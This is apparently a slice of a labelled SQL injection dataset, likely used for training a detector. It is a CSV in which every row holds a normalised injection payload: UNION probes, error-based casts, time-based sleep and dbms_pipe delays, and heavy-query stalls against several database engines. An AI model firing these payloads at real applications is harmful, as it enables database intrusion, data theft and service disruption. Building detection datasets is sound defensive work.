row_index,payload_norm,label,sqli_type_hint
4260,"1%"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""%"" = """,1,
4261,"-8129' ) ) ) union all select 4531,4531,4531#",1,
4262,"1"" ) union all select null,null,null,null,null,null,null,null,null#",1,
4263,"1' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
4264,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 3770 = 3770",1,
4265,1' ) as gogu where 4338 = 4338 union all select null#,1,
4266,"-6096' ) where 1316 = 1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1,
4267,"1, ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",1,
4268,"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""ieuj"" like ""ieuj",1,
4269,1 where 2384 = 2384 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
4270,"1%' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",1,
4271,"1"" ) union all select null,null,null,null,null,null,null,null,null--",1,
4272,"1 ) as mnyy where 4409 = 4409 union all select null,null,null,null--",1,
4273,"1"" where 9725 = 9725",1,
4274,"-7580' ) ) as mmqt where 3468 = 3468 union all select 3468,3468,3468,3468,3468,3468#",1,
4275,"1%"" union all select null,null,null,null,null,null--",1,
4276,"1 ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4277,"1"" ) as ipxg where 4031 = 4031 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,
4278,"1' ) as jysm where 8961 = 8961 union all select null,null#",1,
4279,1' ) ) as xcvg where 1157 = 1157 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1,
4280,"1"" ) and sleep ( 5 ) and ( ""ytof"" = ""ytof",1,
4281,"1"" ) as pobe where 1704 = 1704",1,
4282,"1"" where 9332 = 9332 union all select null,null,null,null,null,null,null,null,null--",1,
4283,-2432' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'ejhp' = 'ejhp,1,
4284,-8641%' order by 1--,1,
4285,"-3249' ) ) ) union all select 6309,6309#",1,
4286,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'yqbo' = 'yqbo,1,
4287,1' ) as nexa where 6740 = 6740,1,
4288,"1"" ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""rvub"" like ""rvub",1,
4289,"-7741' ) where 8271 = 8271 union all select 8271,8271,8271,8271,8271,8271,8271#",1,
